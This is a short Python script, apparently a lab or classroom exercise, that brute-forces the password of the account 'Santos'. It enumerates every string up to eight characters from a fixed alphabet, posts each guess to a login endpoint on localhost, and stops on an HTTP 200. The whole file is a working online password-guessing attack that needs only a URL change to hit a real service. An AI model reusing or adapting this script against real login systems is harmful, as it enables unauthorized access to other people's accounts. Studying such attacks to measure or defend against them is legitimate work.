import time
import requests

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@"

username = "Santos"

intentos = 0
inicio = time.time()

longitud = 1
encontrado = False

while not encontrado and longitud <= 8:
    indices = [0] * longitud

    while True:
        intento = ""
        for i in indices:
            intento += alphabet[i]

        intentos += 1

        response = requests.post(
            "http://127.0.0.1:8000/login",
            json={"username": username, "password": intento}
        )

        if response.status_code == 200:
            encontrado = True
            break

        if intentos % 1000 == 0:
            print("Intentos:", intentos)

        pos = longitud - 1
        while pos >= 0:
            indices[pos] += 1
            if indices[pos] < len(alphabet):
                break
            else:
                indices[pos] = 0
                pos -= 1

        if pos < 0:
            break

    longitud += 1

fin = time.time()

if encontrado:
    print("Contraseña encontrada:", intento)
    print("Intentos:", intentos)
    print("Tiempo:", fin - inicio, "segundos")
else:
    print("No se encontró la contraseña")